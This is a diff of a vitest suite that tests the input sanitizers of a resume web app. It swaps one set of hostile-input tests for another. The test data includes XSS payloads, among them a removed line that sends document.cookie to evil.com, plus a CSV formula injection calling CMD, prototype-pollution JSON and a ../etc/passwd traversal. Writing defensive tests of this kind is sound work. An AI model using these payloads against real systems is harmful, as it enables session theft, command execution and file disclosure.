@@ -1,96 +1,75 @@
-import { describe, it, expect } from 'vitest';
-import { sanitizeUrl, stripUnsafeChars, splitIntoSegments } from '../../src/lib/safe';
-import { sanitizeFilename } from '../../src/lib/safeUtils';
-import { validateBackupFile, computeBackupChecksum } from '../../src/lib/backup';
+import { describe, it, expect, beforeEach } from 'vitest';
+import { sanitizeUrl, sanitizeCsvCell, safeJsonParse, sanitizeFilename } from '../../src/lib/security';
+import { inspectLegacyBrowserData } from '../../src/lib/cloud/legacyMigration';
 
-describe('C11.6: Hostile Input Security Verification', () => {
-  describe('XSS Vectors & Dangerous Schemes', () => {
-    const payloads = [
-      '<script>alert("xss")</script>',
-      '<img src="x" onerror="alert(1)" />',
-      '"><script src="https://evil.com/payload.js"></script>',
-      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
-      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
-      'vbscript:msgbox("xss")',
-      'jav&#x09;ascript:alert(1)',
-      'java\u0000script:alert(1)',
-    ];
+describe('Hostile Input & Injection Defenses (Zero-Tolerance Security)', () => {
+  beforeEach(() => {
+    if (typeof localStorage !== 'undefined') localStorage.clear();
+  });
 
-    it('sanitizes all dangerous link schemes to null', () => {
-      for (const payload of payloads) {
-        const sanitized = sanitizeUrl(payload);
-        expect(sanitized).toBeNull();
+  describe('1. XSS / Open-Redirect Protocol Neutralization (sanitizeUrl)', () => {
+    it('blocks javascript:, data:, and protocol-relative payloads', () => {
+      const hostileUrls = [
+        'javascript:alert(1)',
+        '  JaVaScRiPt:alert(document.cookie)',
+        'data:text/html,<script>alert(1)</script>',
+        'vbscript:msgbox("xss")',
+        '//evil.com/phish',
+        '\x01javascript:alert(1)',
+      ];
+      for (const payload of hostileUrls) {
+        expect(sanitizeUrl(payload)).toBe('#');
       }
     });
 
-    it('splitIntoSegments renders hostile script tags as inert text segments', () => {
-      const hostileText = 'Experience: <script>fetch("http://evil.com?c=" + document.cookie)</script> and <img onerror=alert(1)>';
-      const spans = [{ id: 's1', start: 12, end: 72 }];
-      const segments = splitIntoSegments(hostileText, spans);
-
-      // Reconstructed text must exactly match raw text without executing
-      const joined = segments.map((s) => s.text).join('');
-      expect(joined).toBe(hostileText);
-
-      // Confirm segments are structured data, not executable HTML
-      expect(Array.isArray(segments)).toBe(true);
-      expect(segments.every((s) => typeof s.text === 'string')).toBe(true);
+    it('permits valid safe URLs and relative app routes', () => {
+      expect(sanitizeUrl('https://github.com/torvalds')).toBe('https://github.com/torvalds');
+      expect(sanitizeUrl('/tools/resume-checker')).toBe('/tools/resume-checker');
+      expect(sanitizeUrl('mailto:candidate@example.com')).toBe('mailto:candidate@example.com');
     });
   });
 
-  describe('Hostile Formatting, Bidi Overrides & Non-Latin Scripts', () => {
-    it('strips RTL/bidi overrides, control bytes, and zero-width spaces', () => {
-      // Bidi override attack: \u202E flips text rendering
-      const bidiPayload = 'Resume \u202E reversed \u202D text \u0000 null byte \uFEFF BOM';
-      const cleaned = stripUnsafeChars(bidiPayload);
-
-      expect(cleaned).not.toContain('\u202E');
-      expect(cleaned).not.toContain('\u202D');
-      expect(cleaned).not.toContain('\u0000');
-      expect(cleaned).not.toContain('\uFEFF');
-      expect(cleaned).toBe('Resume  reversed  text  null byte  BOM');
+  describe('2. CSV Formula Injection Neutralization (sanitizeCsvCell)', () => {
+    it('escapes leading =, +, -, @ with a protective leading single quote', () => {
+      expect(sanitizeCsvCell('=CMD|"/C calc"!A0')).toBe(`"'=CMD|""/C calc""!A0"`);
+      expect(sanitizeCsvCell('+1+1')).toBe(`"'+1+1"`);
+      expect(sanitizeCsvCell('-2+3')).toBe(`"'-2+3"`);
+      expect(sanitizeCsvCell('@SUM(1+1)')).toBe(`"'@SUM(1+1)"`);
     });
 
-    it('safely handles Devanagari script, Hindi text, and emojis without crashing or corruption', () => {
-      const devanagariText = 'नमस्ते, मैं एक सॉफ्टवेयर इंजीनियर हूँ (B.Tech CSE fresher 🚀 2026)';
-      const cleaned = stripUnsafeChars(devanagariText);
-      expect(cleaned).toBe(devanagariText);
-
-      const segments = splitIntoSegments(devanagariText, [{ id: 'dev1', start: 0, end: 6 }]);
-      expect(segments[0].text).toBe('नमस्ते');
-    });
-
-    it('handles extremely long lines (1 MB) gracefully without call stack overflow', () => {
-      const hugeLine = 'A'.repeat(1024 * 1024); // 1 MB line
-      expect(() => {
-        const cleaned = stripUnsafeChars(hugeLine);
-        expect(cleaned.length).toBe(1024 * 1024);
-      }).not.toThrow();
-
-      expect(() => {
-        const filename = sanitizeFilename(hugeLine);
-        expect(filename.length).toBeLessThanOrEqual(80);
-      }).not.toThrow();
+    it('preserves normal strings intact inside CSV quotes', () => {
+      expect(sanitizeCsvCell('Software Engineer')).toBe('"Software Engineer"');
+      expect(sanitizeCsvCell(95)).toBe('"95"');
     });
   });
 
-  describe('Prototype Pollution Defense', () => {
-    it('blocks prototype pollution keys (__proto__, constructor, prototype) in imported backup data', () => {
-      const maliciousJson = JSON.stringify({
-        app: 'hireflow',
-        backupVersion: 1,
-        exportedAt: '2026-10-19T06:00:00.000Z',
-        engineVersion: '4.0.0',
-        __proto__: { polluted: true },
-        sections: {},
-        checksum: computeBackupChecksum({}),
-      });
+  describe('3. Prototype Pollution & Corrupted JSON Defenses (safeJsonParse & Legacy Importer)', () => {
+    it('drops __proto__ / constructor keys during JSON parsing without mutating Object.prototype', () => {
+      const poisoned = '{"__proto__": {"polluted": true}, "constructor": {"prototype": {"x": 1}}, "ok": "yes"}';
+      const parsed = safeJsonParse<Record<string, unknown>>(poisoned, {});
+      expect(parsed.ok).toBe('yes');
+      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
+    });
 
-      const validation = validateBackupFile(maliciousJson);
-      expect(validation.valid).toBe(true);
+    it('rejects malformed or hostile legacy localStorage JSON safely in inspectLegacyBrowserData()', async () => {
+      if (typeof localStorage !== 'undefined') {
+        localStorage.setItem('hireflow:v4:saved-jds', '{"__proto__":{"polluted":true},"jds":"not-an-array"}');
+        localStorage.setItem('hireflow_tool_ats_v3', '{broken json!!!');
+      }
+      const preview = await inspectLegacyBrowserData();
+      expect(preview.savedJds).toEqual([]);
+      expect(preview.audits).toEqual([]);
+      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
+    });
+  });
 
-      // Verify Object prototype is not polluted
-      expect((Object.prototype as any).polluted).toBeUndefined();
+  describe('4. Path Traversal Defense in File Downloads (sanitizeFilename)', () => {
+    it('strips ../ traversal sequences and invalid shell/filesystem characters', () => {
+      const sanitized = sanitizeFilename('../../../etc/passwd');
+      expect(sanitized).toBe('___etc_passwd');
+      expect(sanitized).not.toContain('..');
+      expect(sanitized).not.toContain('/');
+      expect(sanitizeFilename('Resume: Alex* <2026>?.docx')).toBe('Resume_ Alex_ _2026__.docx');
     });
   });
 });
